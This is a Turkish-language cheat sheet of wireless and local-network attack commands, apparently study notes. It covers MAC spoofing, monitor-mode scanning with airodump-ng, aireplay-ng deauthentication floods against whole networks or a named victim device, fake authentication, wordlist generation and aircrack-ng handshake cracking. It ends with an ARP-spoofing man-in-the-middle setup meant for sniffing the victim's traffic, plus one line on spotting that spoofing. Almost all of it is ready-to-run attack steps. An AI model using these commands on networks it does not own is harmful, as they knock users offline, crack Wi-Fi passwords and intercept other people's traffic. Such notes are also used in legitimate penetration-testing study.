kablasoz ağ arayüzünü kapatır
```
ifconfig wlan0 down
```
kablasoz ağ arayüzünü açar
```
ifconfig wlan0 up
```
mac değişimi (ifconfig ile)
```
ifconfig wlan0 hw ether yeni-mac-adresi
```
random mac adresi değiştirme (maccahnger kurulu değil ise kurun, ağı kullanırken mac adresi değişmez, öncelikle ağdan kopun, bu örnekte wlan0 yani kablosuz ağ için mac değiştirme yapıyoruz)
```
macchanger --random wlan0
```
ağ ayarlarına reset atar (değişen mac eski haline döner)
```
service NetworkManager restart
```


ifconfig e göre farkı wireless ile ilgili bilgi verir 
ve bu bilgiyi daha ayrıntılı verir
```
iwconfig
```

monitor mod nedir ?
```
bağlı olmadığımız ağlar hakkında bilgi alabilmemizi sağlar
```

monitor moda geçmek
```
airmon-ng start wlan0   (wlan0 ağ ismi, sizde farklı ise sizdekini yazaın)
```

managed moda geçmek
```
airmon-ng stop wlan0mon   (ağ adı değişmedi ise mon ekine gerek yok)
```


ağ taraması yapmak
```
airodump-ng wlan0mon (wlan0mon değişebilir ağ adınız ne ise onu kullanın)
```


airodump-ng ile gelen datayı anlamak
```
BSSID nedir: modemin mac adresidir
PWR nedir: negatif sayı büyüdükçe o ağa daha yakınsın
Beacons: 
Data:
CH: modemin hangi kanalda kullanıldığını gösterir
ENC: şifreleme bilgisi
```


seçilmiş ağa ayrıntılı tarama yapmak
```
örenk channel:8
örnek mac: 00:00:00:11:00:00:00
airodump-ng --channel 8 --bssid 00:00:00:11:00:00:00 --write airodumptest wlan0mon

"--write dosyaadi" bu paramtereyi işlem sonucunu kaydetmek
istediğimizde kullanırız. kullanımı opsiyoneldir
```


yetkisizlendirme saldırısı
```
bütün cihazları ağdan düşür;
örnek paket sayısı: 10000
örnek mac: 00:00:00:11:00:00:00
aireplay-ng --deauth 10000 -a 00:00:00:11:00:00:00 wlan0mon

belli bir cihazı ağdan düşür;
örnek paket sayısı: 10000
örnek kurban mac: 00:00:A9:11:9B:00:00
aireplay-ng --deauth 10000 -a 00:00:00:11:00:00:00 -c 00:00:A9:11:9B:00:00 wlan0mon

```


fake wireless bağlantısı
```6
paket sayısı :0
örnek modem mac: 00:00:00:11:00:00:00
örnek sahte bağlantı cihazı mac adresi: 00:C0:CA:92:8F:6E
örnek modem mac
aireplay-ng --fakeauth 0 -a 00:00:00:11:00:00:00 -h 00:C0:CA:92:8F:6E wlan0mon
```


crunch ile 8,9 hane arası  wordlist
```
crunch 8 9 gzuor672 -o testWordList.txt
```


aircrack ile word list kullanımı
```
aircrack-ng handshake-cap-dosyası -w wordlist-dosyası
```


bağlı olduğumuz ağdaki cihazları bulma
```
bağlanma yöntemi örnek: eth0
örnek ip: 10.0.2.4
örnek broadcast: 24
örnek paket sayısı: 10
netdiscover -i eth0 -r 10.0.2.4/24 -c 10
```


bağlı olduğumuz ağdaki cihazları bulma (nmap ile)
```
nmap 10.0.2.1/24
```

ortadaki adam saldırısı
```
başlamadan önce:

echo 1 > /proc/sys/net/ipv4/ip_forward
komutu ile arp servisini başlatmak gerekir. default olarak
bu dosya içinde 0 yazar. bu komut veya bir editör ile 
bunu 1 yapmak gerekir. linux her açıldığında 1 yapılması 
gerekir.

arp protokolü ile kendimizi modem olarak göstermek

arpspoof -i eth0 -t kurban-ip modem-ip
veya
arpspoof -i eth0 -t modem-ip kurban-ip

bu komuttan sonra hedef cihazın trafiği bizim üzerimizden geçecek
ve biz modem olarak algılanacağız
windowsta arp -a komuutunu çalıştır. 
modemin mac adresi iki ayrı ip tarafından kullanılıyor ise 
saldırı altındasınız demektir.

bundan sonra wireshrak ile dinleme yapmaya başlayabiliriz
```